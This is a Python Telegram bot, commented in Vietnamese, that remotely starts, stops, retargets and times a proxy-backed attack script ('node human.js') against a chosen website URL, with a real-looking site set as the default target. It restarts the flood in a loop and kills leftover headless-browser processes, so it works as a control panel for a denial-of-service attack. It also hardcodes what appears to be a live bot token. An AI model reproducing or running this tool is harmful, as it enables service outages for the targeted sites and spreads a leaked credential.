# -*- coding: utf-8 -*-
import subprocess
import time
import os
import signal
import threading
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
import logging

# --- Configuration ---
BOT_TOKEN = "8428972882:AAEhpihivZG1ouJf_Vq9Soyg3GuW2vMwIz0"  # Thay bằng token bot Telegram của bạn
URL = "https://rg8369g.net/"  # URL mặc định, có thể thay đổi bằng lệnh /seturl
TIME_LIMIT = 1200
PROXY_FILE = "abc.txt"

# Trạng thái bot
is_running = False
attack_thread = None
current_process = None
stop_flag = threading.Event()

# Setup logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

def check_file_exists(filename):
    if not os.path.isfile(filename):
        logger.error(f"File '{filename}' not found.")
        return False
    return True

def cleanup_processes():
    """Dọn dẹp các process đang chạy"""
    try:
        subprocess.run(["pkill", "-9", "chrome"], stderr=subprocess.DEVNULL, timeout=5)
        subprocess.run(["pkill", "-9", "Xvfb"], stderr=subprocess.DEVNULL, timeout=5)
        subprocess.run(["pkill", "-9", "node"], stderr=subprocess.DEVNULL, timeout=5)
        logger.info("Cleaned up processes")
    except Exception as e:
        logger.error(f"Error cleaning up: {e}")

def run_attack():
    """Hàm chạy script tấn công"""
    global current_process, is_running, URL, TIME_LIMIT
    
    while not stop_flag.is_set() and is_running:
        if not check_file_exists(PROXY_FILE):
            logger.warning("Waiting for proxy file...")
            time.sleep(1)
            continue

        try:
            logger.info(f"Starting new process on URL: {URL}")
            cmd = ["node", "human.js", URL, "140000", PROXY_FILE, "8", "821"]
            current_process = subprocess.Popen(cmd)
            
            # Chờ đến khi TIME_LIMIT hoặc stop_flag được set
            start_time = time.time()
            while (time.time() - start_time) < TIME_LIMIT and not stop_flag.is_set():
                time.sleep(1)
                if current_process.poll() is not None:
                    logger.info("Process ended early")
                    break
            
            if current_process.poll() is None and not stop_flag.is_set():
                elapsed_time = time.time() - start_time
                logger.info(f"Đã chạy {elapsed_time:.0f}s. Dừng process để restart...")
                current_process.terminate()
                try:
                    current_process.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    current_process.kill()
                logger.info("Process đã dừng, chuẩn bị restart...")
                    
        except Exception as e:
            logger.error(f"An error occurred: {e}")
        
        if not stop_flag.is_set():
            cleanup_processes()
            logger.info(f"Đã dọn dẹp. Đợi 2 giây trước khi restart... (Time limit: {TIME_LIMIT}s)")
            time.sleep(2)
    
    # Dọn dẹp khi dừng
    if current_process and current_process.poll() is None:
        try:
            current_process.terminate()
            current_process.wait(timeout=5)
        except:
            current_process.kill()
    cleanup_processes()
    logger.info("Attack thread stopped")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Lệnh /start"""
    await update.message.reply_text(
        "🤖 Bot điều khiển script đã sẵn sàng!\n\n"
        "Các lệnh:\n"
        "/on - Bật script\n"
        "/off - Tắt script\n"
        "/status - Kiểm tra trạng thái\n"
        "/seturl <url> - Thay đổi URL target\n"
        "/geturl - Xem URL hiện tại\n"
        "/settime <seconds> - Thay đổi thời gian chạy (giây)\n"
        "/gettime - Xem thời gian chạy hiện tại"
    )

async def turn_on(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Lệnh /on - Bật script"""
    global is_running, attack_thread, stop_flag
    
    if is_running:
        await update.message.reply_text("⚠️ Script đã đang chạy!")
        return
    
    if not check_file_exists(PROXY_FILE):
        await update.message.reply_text(f"❌ Không tìm thấy file proxy: {PROXY_FILE}")
        return
    
    is_running = True
    stop_flag.clear()
    attack_thread = threading.Thread(target=run_attack, daemon=True)
    attack_thread.start()
    
    await update.message.reply_text("✅ Script đã được bật và đang chạy!")

async def turn_off(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Lệnh /off - Tắt script"""
    global is_running, stop_flag, current_process
    
    if not is_running:
        await update.message.reply_text("⚠️ Script chưa được bật!")
        return
    
    is_running = False
    stop_flag.set()
    
    await update.message.reply_text("🛑 Đang dừng script và dọn dẹp processes...")
    
    # Dừng process hiện tại ngay lập tức
    if current_process and current_process.poll() is None:
        try:
            current_process.terminate()
            current_process.wait(timeout=3)
        except subprocess.TimeoutExpired:
            current_process.kill()
        except Exception as e:
            logger.error(f"Error stopping process: {e}")
    
    # Đợi thread dừng
    if attack_thread:
        attack_thread.join(timeout=10)
    
    # Cleanup tất cả processes
    cleanup_processes()
    
    await update.message.reply_text("✅ Script đã được tắt và đã dọn dẹp tất cả processes!")

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Lệnh /status - Kiểm tra trạng thái"""
    global is_running, current_process, URL
    
    status_text = f"📊 Trạng thái:\n\n"
    status_text += f"Script: {'🟢 Đang chạy' if is_running else '🔴 Đã dừng'}\n"
    
    if is_running and current_process:
        if current_process.poll() is None:
            status_text += f"Process: 🟢 Đang chạy (PID: {current_process.pid})\n"
        else:
            status_text += f"Process: 🔴 Đã dừng\n"
    
    status_text += f"\nURL: {URL}\n"
    status_text += f"Time Limit: {TIME_LIMIT}s\n"
    status_text += f"Proxy File: {PROXY_FILE}"
    
    await update.message.reply_text(status_text)

async def set_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Lệnh /seturl - Thay đổi URL target"""
    global URL, is_running
    
    if not context.args:
        await update.message.reply_text(
            "❌ Vui lòng cung cấp URL!\n\n"
            "Cú pháp: /seturl <url>\n"
            "Ví dụ: /seturl https://example.com/"
        )
        return
    
    new_url = context.args[0].strip()
    
    # Kiểm tra URL hợp lệ (cơ bản)
    if not (new_url.startswith("http://") or new_url.startswith("https://")):
        await update.message.reply_text(
            "❌ URL không hợp lệ! URL phải bắt đầu bằng http:// hoặc https://\n\n"
            f"URL bạn nhập: {new_url}"
        )
        return
    
    # Kiểm tra nếu script đang chạy
    if is_running:
        await update.message.reply_text(
            "⚠️ Script đang chạy! Vui lòng tắt script trước khi thay đổi URL.\n"
            "Sử dụng lệnh /off để tắt script."
        )
        return
    
    old_url = URL
    URL = new_url
    logger.info(f"URL changed from {old_url} to {URL}")
    
    await update.message.reply_text(
        f"✅ URL đã được thay đổi!\n\n"
        f"URL cũ: {old_url}\n"
        f"URL mới: {URL}"
    )

async def get_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Lệnh /geturl - Xem URL hiện tại"""
    global URL
    
    await update.message.reply_text(
        f"🌐 URL hiện tại:\n\n{URL}\n\n"
        f"Để thay đổi URL, sử dụng: /seturl <url>"
    )

async def set_time(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Lệnh /settime - Thay đổi thời gian chạy (TIME_LIMIT)"""
    global TIME_LIMIT, is_running
    
    if not context.args:
        await update.message.reply_text(
            "❌ Vui lòng cung cấp thời gian (giây)!\n\n"
            "Cú pháp: /settime <seconds>\n"
            "Ví dụ: /settime 1800 (30 phút)\n"
            "Ví dụ: /settime 3600 (1 giờ)"
        )
        return
    
    try:
        new_time = int(context.args[0].strip())
        
        # Kiểm tra giá trị hợp lệ
        if new_time <= 0:
            await update.message.reply_text(
                "❌ Thời gian phải lớn hơn 0 giây!"
            )
            return
        
        if new_time > 86400:  # 24 giờ
            await update.message.reply_text(
                "❌ Thời gian không được vượt quá 86400 giây (24 giờ)!"
            )
            return
        
    except ValueError:
        await update.message.reply_text(
            "❌ Thời gian không hợp lệ! Vui lòng nhập số nguyên.\n\n"
            "Ví dụ: /settime 1200"
        )
        return
    
    # Kiểm tra nếu script đang chạy
    if is_running:
        await update.message.reply_text(
            "⚠️ Script đang chạy! Vui lòng tắt script trước khi thay đổi thời gian.\n"
            "Sử dụng lệnh /off để tắt script."
        )
        return
    
    old_time = TIME_LIMIT
    TIME_LIMIT = new_time
    logger.info(f"TIME_LIMIT changed from {old_time}s to {TIME_LIMIT}s")
    
    # Chuyển đổi sang phút và giờ để dễ đọc
    old_minutes = old_time // 60
    old_hours = old_minutes // 60
    old_mins = old_minutes % 60
    
    new_minutes = TIME_LIMIT // 60
    new_hours = new_minutes // 60
    new_mins = new_minutes % 60
    
    old_time_str = f"{old_time}s"
    if old_hours > 0:
        old_time_str = f"{old_hours}h {old_mins}m ({old_time}s)"
    elif old_minutes > 0:
        old_time_str = f"{old_minutes}m ({old_time}s)"
    
    new_time_str = f"{TIME_LIMIT}s"
    if new_hours > 0:
        new_time_str = f"{new_hours}h {new_mins}m ({TIME_LIMIT}s)"
    elif new_minutes > 0:
        new_time_str = f"{new_minutes}m ({TIME_LIMIT}s)"
    
    await update.message.reply_text(
        f"✅ Thời gian chạy đã được thay đổi!\n\n"
        f"Thời gian cũ: {old_time_str}\n"
        f"Thời gian mới: {new_time_str}"
    )

async def get_time(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Lệnh /gettime - Xem thời gian chạy hiện tại"""
    global TIME_LIMIT
    
    minutes = TIME_LIMIT // 60
    hours = minutes // 60
    mins = minutes % 60
    
    time_str = f"{TIME_LIMIT} giây"
    if hours > 0:
        time_str = f"{hours} giờ {mins} phút ({TIME_LIMIT} giây)"
    elif minutes > 0:
        time_str = f"{minutes} phút ({TIME_LIMIT} giây)"
    
    await update.message.reply_text(
        f"⏱️ Thời gian chạy hiện tại:\n\n{time_str}\n\n"
        f"Để thay đổi, sử dụng: /settime <seconds>"
    )

def main():
    """Hàm main để khởi động bot"""
    # Kiểm tra token
    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        logger.error("Vui lòng cấu hình BOT_TOKEN trong file!")
        return
    
    # Tạo application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Đăng ký các lệnh
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("on", turn_on))
    application.add_handler(CommandHandler("off", turn_off))
    application.add_handler(CommandHandler("status", status))
    application.add_handler(CommandHandler("seturl", set_url))
    application.add_handler(CommandHandler("geturl", get_url))
    application.add_handler(CommandHandler("settime", set_time))
    application.add_handler(CommandHandler("gettime", get_time))
    
    # Chạy bot
    logger.info("Bot đang khởi động...")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()


